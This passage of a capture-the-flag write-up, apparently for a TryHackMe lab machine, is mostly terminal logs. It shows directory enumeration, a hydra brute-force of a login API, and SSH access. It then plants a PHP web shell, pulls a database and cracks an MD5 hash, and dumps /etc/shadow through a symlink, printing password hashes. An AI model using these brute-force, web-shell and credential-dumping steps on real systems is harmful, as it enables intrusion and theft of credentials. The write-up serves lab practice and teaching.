+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Pig$ gobuster dir -u http://10.10.22.166/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Gobuster v3.0.1
+</span></span><span class=line><span class=cl>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>[+] Url:            http://10.10.22.166/
+</span></span><span class=line><span class=cl>[+] Threads:        10
+</span></span><span class=line><span class=cl>[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+</span></span><span class=line><span class=cl>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span class=line><span class=cl>[+] User Agent:     gobuster/3.0.1
+</span></span><span class=line><span class=cl>[+] Extensions:     html,php,txt
+</span></span><span class=line><span class=cl>[+] Timeout:        10s
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/25 17:34:05 Starting gobuster
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/.htaccess (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.html (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.php (Status: 403)
+</span></span><span class=line><span class=cl>/.htaccess.txt (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.php (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.txt (Status: 403)
+</span></span><span class=line><span class=cl>/.htpasswd.html (Status: 403)
+</span></span><span class=line><span class=cl>/admin (Status: 301)
+</span></span><span class=line><span class=cl>/api (Status: 301)
+</span></span><span class=line><span class=cl>/assets (Status: 301)
+</span></span><span class=line><span class=cl>/css (Status: 301)
+</span></span><span class=line><span class=cl>Progress: 7375 / 20470 (36.03%)^C
+</span></span><span class=line><span class=cl>[!] Keyboard interrupt detected, terminating.
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/25 17:35:46 Finished
+</span></span><span class=line><span class=cl>===============================================================
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.22.166/login.php>http://10.10.22.166/login.php</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /api/login HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 10.10.22.166
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+</span></span><span class=line><span class=cl>Accept: application/json
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://10.10.22.166/login.php
+</span></span><span class=line><span class=cl>Content-Type: text/plain;charset=UTF-8
+</span></span><span class=line><span class=cl>Origin: http://10.10.22.166
+</span></span><span class=line><span class=cl>Content-Length: 64
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{&#34;username&#34;:&#34;asd&#34;,&#34;password&#34;:&#34;7815696ecbf1c96e6894b779456d330e&#34;}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Date: Sun, 25 Oct 2020 16:40:05 GMT
+</span></span><span class=line><span class=cl>Server: Apache/2.4.29 (Ubuntu)
+</span></span><span class=line><span class=cl>Content-Length: 63
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Content-Type: text/html; charset=UTF-8
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{&#34;Response&#34;:&#34;Error&#34;,&#34;Verbose&#34;:&#34;Incorrect Username or Password&#34;}
+</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/writeups/tryhackme/year-of-the-pig/2020-10-25_17-41.png alt></p><p><code>Remember that passwords should be a memorable word, followed by two numbers and a special character</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Wordlist mode rules
+</span></span><span class=line><span class=cl>[List.Rules:Wordlist]
+</span></span><span class=line><span class=cl># Try words as they are
+</span></span><span class=line><span class=cl>:
+</span></span><span class=line><span class=cl># Lowercase every pure alphanumeric word
+</span></span><span class=line><span class=cl>-c &gt;3 !?X l Q
+</span></span><span class=line><span class=cl># Capitalize every pure alphanumeric word
+</span></span><span class=line><span class=cl>-c (?a &gt;2 !?X c Q
+</span></span><span class=line><span class=cl># Lowercase and pluralize pure alphabetic words
+</span></span><span class=line><span class=cl>&lt;* &gt;2 !?A l p
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Pig$ john -w=wordlist.txt --rules --stdout &gt; capitalised-list
+</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
+</span></span><span class=line><span class=cl>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Wordlist mode rules
+</span></span><span class=line><span class=cl>[List.Rules:Wordlist]
+</span></span><span class=line><span class=cl># Try words as they are
+</span></span><span class=line><span class=cl>#:
+</span></span><span class=line><span class=cl>$[0-9]$[0-9]$[!.?,]
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Pig$ john -w=capitalised-list --rules --stdout &gt; mutated-list
+</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
+</span></span><span class=line><span class=cl>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class=line><span class=cl>3498064p 0:00:00:01 100.00% (2020-10-25 17:46) 2332Kp/s Plugineding
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Pig$ hydra -l marco -P hashed-list 10.10.22.166 http-post-form &#34;/api/login:{\&#34;username\&#34;\:\&#34;^USER^\&#34;,\&#34;password\&#34;\:\&#34;^PASS^\&#34;}:F=Incorrect&#34; -I
+</span></span><span class=line><span class=cl>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-25 17:52:47
+</span></span><span class=line><span class=cl>[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+</span></span><span class=line><span class=cl>[DATA] max 16 tasks per 1 server, overall 16 tasks, 3498064 login tries (l:1/p:3498064), ~218629 tries per task
+</span></span><span class=line><span class=cl>[DATA] attacking http-post-form://10.10.22.166:80/api/login:{&#34;username&#34;\:&#34;^USER^&#34;,&#34;password&#34;\:&#34;^PASS^&#34;}:F=Incorrect
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: b0efb8ae58114b5bfc6c49a8124e2cdf
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: c6147f769ab7c56f89c2f08dc168ee18
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: 21655f352dc05a9999b10295cd3c937b
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: 547f64704e1d834ee7d1f1a4945f27ce
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: 12ed6322e0e85588f13a77e361d76add
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: 653b5a50bf95eb258d305a4548e308e3
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: ccc3c41b45dc75b1f4fc98a5573abcb8
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: 42fd83254c7f4c059a33d067ac067031
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: 9e77aa660403845238431a49ed35b6a4
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: db2b3cc37850ec719f9ad9999cbe6bce
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: a594e5cc1c89be2915fcbdb32b6c5569
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: 3f07d7f2a4ab78c903de1259f15e4b06
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: b6b715b91687324a2e2cd5f8318a8016
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: 416f9f1ed896ca81f871347bd7995227
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: e58b14a77c7b19958a086092e57998ed
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.22.166   login: marco   password: 3347a5b5f16e4af642e8a1b21d047db7
+</span></span><span class=line><span class=cl>1 of 1 target successfully completed, 16 valid passwords found
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-25 17:52:49
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wfuzz -w hashed-list -H &#34;User-Agent: Bypass&#34; -X POST -d &#39;{&#34;username&#34;:&#34;marco&#34;,&#34;password&#34;:&#34;FUZZ&#34;}&#39; -u http://10.10.22.166/api/login --hh 63
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Pig$ sed -n &#39;705943p&#39; mutated-list
+</span></span><span class=line><span class=cl>savoia21!
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Pig$ ssh marco@10.10.22.166
+</span></span><span class=line><span class=cl>The authenticity of host &#39;10.10.22.166 (10.10.22.166)&#39; can&#39;t be established.
+</span></span><span class=line><span class=cl>ECDSA key fingerprint is SHA256:2KjF+8WJY6OrFINzn62WeweHnY6FXTMQ9Xfa6RTvPhA.
+</span></span><span class=line><span class=cl>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span class=line><span class=cl>Warning: Permanently added &#39;10.10.22.166&#39; (ECDSA) to the list of known hosts.
+</span></span><span class=line><span class=cl>marco@10.10.22.166&#39;s password:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        __   __                       __   _   _            ____  _
+</span></span><span class=line><span class=cl>        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \(_) __ _
+</span></span><span class=line><span class=cl>         \ V / _ \/ _` | &#39;__|  / _ \| |_  | __| &#39;_ \ / _ \ | |_) | |/ _` |
+</span></span><span class=line><span class=cl>          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  __/| | (_| |
+</span></span><span class=line><span class=cl>          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|   |_|\__, |
+</span></span><span class=line><span class=cl>                                                                    |___/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>marco@year-of-the-pig:~$ ls
+</span></span><span class=line><span class=cl>flag1.txt
+</span></span><span class=line><span class=cl>marco@year-of-the-pig:~$ cat flag1.txt
+</span></span><span class=line><span class=cl>THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>marco@year-of-the-pig:~$ id
+</span></span><span class=line><span class=cl>uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>echo</span> <span class=s1>&#39;&lt;?php system($_GET[&#39;</span><span class=nx>c</span><span class=s1>&#39;]); ?&gt;&#39;</span> <span class=o>&gt;</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nx>www</span><span class=o>/</span><span class=nx>html</span><span class=o>/</span><span class=nx>test</span><span class=o>.</span><span class=nx>php</span> <span class=o>&amp;&amp;</span> <span class=nx>chmod</span> <span class=mi>777</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nx>www</span><span class=o>/</span><span class=nx>html</span><span class=o>/</span><span class=nx>test</span><span class=o>.</span><span class=nx>php</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Year</span> <span class=n>of</span> <span class=n>the</span> <span class=n>Pig</span><span class=o>$</span> <span class=n>curl</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>22.166</span><span class=o>/</span><span class=n>test</span><span class=o>.</span><span class=n>php</span><span class=err>?</span><span class=n>c</span><span class=o>=</span><span class=n>cat</span><span class=o>%</span><span class=mi>20</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>admin</span><span class=o>.</span><span class=n>db</span> <span class=o>&gt;</span> <span class=n>admin</span><span class=o>.</span><span class=n>db</span>
+</span></span><span class=line><span class=cl>  <span class=o>%</span> <span class=n>Total</span>    <span class=o>%</span> <span class=n>Received</span> <span class=o>%</span> <span class=n>Xferd</span>  <span class=n>Average</span> <span class=n>Speed</span>   <span class=n>Time</span>    <span class=n>Time</span>     <span class=n>Time</span>  <span class=n>Current</span>
+</span></span><span class=line><span class=cl>                                 <span class=n>Dload</span>  <span class=n>Upload</span>   <span class=n>Total</span>   <span class=n>Spent</span>    <span class=n>Left</span>  <span class=n>Speed</span>
+</span></span><span class=line><span class=cl><span class=mi>100</span> <span class=mi>20481</span>    <span class=mi>0</span> <span class=mi>20481</span>    <span class=mi>0</span>     <span class=mi>0</span>   <span class=mi>198</span><span class=n>k</span>      <span class=mi>0</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span> <span class=o>--</span><span class=p>:</span><span class=o>--</span><span class=p>:</span><span class=o>--</span>  <span class=mi>200</span><span class=n>k</span>
+</span></span><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Year</span> <span class=n>of</span> <span class=n>the</span> <span class=n>Pig</span><span class=o>$</span> <span class=n>file</span> <span class=n>admin</span><span class=o>.</span><span class=n>db</span>
+</span></span><span class=line><span class=cl><span class=n>admin</span><span class=o>.</span><span class=n>db</span><span class=p>:</span> <span class=n>SQLite</span> <span class=mf>3.</span><span class=n>x</span> <span class=n>database</span><span class=p>,</span> <span class=n>last</span> <span class=n>written</span> <span class=n>using</span> <span class=n>SQLite</span> <span class=n>version</span> <span class=mi>3022000</span>
+</span></span><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Year</span> <span class=n>of</span> <span class=n>the</span> <span class=n>Pig</span><span class=o>$</span> <span class=n>sqlite3</span> <span class=n>admin</span><span class=o>.</span><span class=n>db</span>
+</span></span><span class=line><span class=cl><span class=n>SQLite</span> <span class=n>version</span> <span class=mf>3.31</span><span class=o>.</span><span class=mi>1</span> <span class=mi>2020</span><span class=o>-</span><span class=mi>01</span><span class=o>-</span><span class=mi>27</span> <span class=mi>19</span><span class=p>:</span><span class=mi>55</span><span class=p>:</span><span class=mi>54</span>
+</span></span><span class=line><span class=cl><span class=n>Enter</span> <span class=s2>&#34;.help&#34;</span> <span class=k>for</span> <span class=n>usage</span> <span class=n>hints</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>sqlite</span><span class=o>&gt;</span> <span class=o>.</span><span class=n>tables</span>
+</span></span><span class=line><span class=cl><span class=n>sessions</span>  <span class=n>users</span>
+</span></span><span class=line><span class=cl><span class=n>sqlite</span><span class=o>&gt;</span> <span class=n>show</span> <span class=o>*</span> <span class=n>from</span> <span class=n>users</span>
+</span></span><span class=line><span class=cl>   <span class=o>...&gt;</span> <span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=n>Error</span><span class=p>:</span> <span class=n>near</span> <span class=s2>&#34;show&#34;</span><span class=p>:</span> <span class=n>syntax</span> <span class=n>error</span>
+</span></span><span class=line><span class=cl><span class=n>sqlite</span><span class=o>&gt;</span> <span class=n>select</span> <span class=o>*</span> <span class=n>from</span> <span class=n>users</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mi>58</span><span class=n>a2f366b1fd51e127a47da03afc9995</span><span class=o>|</span><span class=n>marco</span><span class=o>|</span><span class=n>ea22b622ba9b3c41b22785dcb40211ac</span>
+</span></span><span class=line><span class=cl><span class=n>f64ccfff6f64d57b121a85f9385cf256</span><span class=o>|</span><span class=n>curtis</span><span class=o>|</span><span class=n>a80bfe309ecaafcea1ea6cb3677971f2</span>
+</span></span><span class=line><span class=cl><span class=n>sqlite</span><span class=o>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>a80bfe309ecaafcea1ea6cb3677971f2 md5 Donald1983$</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>marco@year-of-the-pig:~$ su - curtis
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>curtis@year-of-the-pig:~$ ls
+</span></span><span class=line><span class=cl>flag2.txt
+</span></span><span class=line><span class=cl>curtis@year-of-the-pig:~$ cat flag2.txt
+</span></span><span class=line><span class=cl>THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>marco</span><span class=err>@</span><span class=n>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>pig</span><span class=p>:</span><span class=o>~$</span> <span class=n>cd</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span> <span class=o>&amp;&amp;</span> <span class=n>mkdir</span> <span class=o>-</span><span class=n>p</span> <span class=n>temp</span><span class=o>/</span><span class=n>temp</span>
+</span></span><span class=line><span class=cl><span class=n>marco</span><span class=err>@</span><span class=n>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>pig</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>$</span> <span class=n>ln</span> <span class=o>-</span><span class=n>s</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>shadow</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>temp</span><span class=o>/</span><span class=n>temp</span><span class=o>/</span><span class=n>config</span><span class=o>.</span><span class=n>php</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root:$6$6Plj/ZBH$Lg5A8NArY2hvL437XI7wtkWFh9xTxpZdjzeeOxCSuCMMuJV.kR/vYa7QunnupHx4jkyk2L1gzA2C1pPELSUsP.:18490:0:99999:7:::
+</span></span><span class=line><span class=cl>daemon:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>bin:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>sys:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>sync:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>games:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>man:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>lp:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>mail:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>news:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>uucp:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>proxy:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>www-data:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>backup:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>list:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>irc:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>nobody:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-network:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>systemd-resolve:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>syslog:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>messagebus:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>_apt:*:17647:0:99999:7:::
+</span></span><span class=line><span class=cl>lxd:*:18490:0:99999:7:::
+</span></span><span class=line><span class=cl>uuidd:*:18490:0:99999:7:::
+</span></span><span class=line><span class=cl>dnsmasq:*:18490:0:99999:7:::
+</span></span><span class=line><span class=cl>landscape:*:18490:0:99999:7:::
+</span></span><span class=line><span class=cl>sshd:*:18490:0:99999:7:::
+</span></span><span class=line><span class=cl>pollinate:*:18490:0:99999:7:::
+</span></span><span class=line><span class=cl>marco:$6$5QVe.J7t$9U9.NEE.eYkUPtWPqx0rw7XJO5TkPd2Z4kwXOrXCir1SR91oUgt0uYAVL0bBxteJI2qvv.XPKQxSUaMtNw3pT/:18491:0:99999:7:::
+</span></span><span class=line><span class=cl>curtis:$6$8y/iqA1P$T1Q53Z3qIJclV.hgwB1E02jSgT2hAiqcHHS1nZiIVnqdG0lPOCYwVFZOGazVUpUQcpd9.8lfxR95m8zRAl.ns0:18495:0:99999:7:::
